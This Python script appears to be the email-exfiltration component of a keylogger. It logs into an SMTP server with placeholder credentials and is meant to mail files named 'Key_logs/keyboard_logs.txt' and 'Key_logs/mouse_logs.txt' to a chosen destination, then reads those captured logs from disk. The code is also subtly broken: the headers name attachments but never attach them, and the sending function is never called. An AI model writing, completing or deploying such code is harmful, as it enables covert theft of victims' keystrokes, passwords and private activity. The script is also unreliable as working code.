import smtplib
from email.message import EmailMessage


def send_email(subject, message, destination):
    # Here you are to replace smtp.example.com with your Email Providers SMTP Servers (and if necessary - the port)
    server = smtplib.SMTP('smtp.example.com', 587)
    server.starttls()
    # This is where you would replace "-------" with your Email and Password to log into your Account
    server.login('-------', '-------')

    msg = EmailMessage()

    message = f'{message}\n'
    msg.set_content(message)
    msg.add_header('Content-Disposition', 'attachment', filename='Key_logs/keyboard_logs.txt')
    msg.add_header('ActualContent', 'attachment', filename='Key_logs/mouse_logs.txt')
    msg['Subject'] = subject
    msg['From'] = 'IAmSendingThisEmail'
    msg['To'] = destination
    server.send_message(msg)

# Opening Log Files and reading into separate Strings
key_logs = open("Key_logs/keyboard_logs.txt")
logs1 = key_logs.read()
mouse_logs = open("Key_logs/mouse_logs.txt")
logs2 = mouse_logs.read()
